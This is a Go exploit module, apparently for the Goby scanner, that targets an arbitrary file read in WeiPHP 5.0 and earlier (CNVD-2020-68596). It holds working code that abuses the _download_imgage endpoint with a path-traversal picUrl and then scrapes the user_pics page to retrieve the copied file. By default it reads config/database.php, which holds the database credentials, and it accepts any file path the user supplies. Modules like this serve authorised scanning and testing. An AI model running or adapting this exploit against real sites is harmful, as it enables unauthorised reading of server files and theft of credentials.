package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "WeiPHP Arbitrary File Read (CNVD-2020-68596)",
    "Description": "WeiPHP ",
    "Product": "WeiPHP <= 5.0",
    "Homepage": "https://www.weiphp.cn/",
    "DisclosureDate": "2021-01-03",
    "Author": "Ovi3",
    "FofaQuery": "app=\"WeiPHP\"",
    "Level": "2",
    "Impact": "A remote attacker who successfully exploited this vulnerability can read arbitrary files on the target system.",
    "Recommendation": "",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2020-68596"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "./../config/database.php",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": null,
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10190"
}`

	uploadAndGetUrl := func(u *httpclient.FixUrl, filePath string) string {
		cfg := httpclient.NewPostRequestConfig("/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=" + filePath)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.Data = "123"
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if resp.StatusCode == 200 {
				reg := regexp.MustCompile(`^\d+$`)
				fileId := reg.FindString(resp.RawBody)
				if fileId != "" {
					cfg2 := httpclient.NewGetRequestConfig("/public/index.php/home/file/user_pics")
					cfg2.VerifyTls = false
					reg2 := regexp.MustCompile(`<img src="(.*?)" width="100" height="100"/><span class="ck-ico"></span><input type="hidden" value="` + fileId + `"/>`)
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						if resp2.StatusCode == 200 {
							m2 := reg2.FindStringSubmatch(resp2.RawBody)
							if m2 != nil {
								fileUrl := m2[1]
								return fileUrl
							}
						}
					}
				}
			}
		}

		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			fileUrl := uploadAndGetUrl(u, "./../config/database.php")
			if fileUrl != "" {
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileUrl := uploadAndGetUrl(expResult.HostInfo, ss.Params["file"].(string))
			if fileUrl != "" {
				cfg := httpclient.NewGetRequestConfig(fileUrl)
				cfg.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}

			}

			return expResult
		},
	))
}
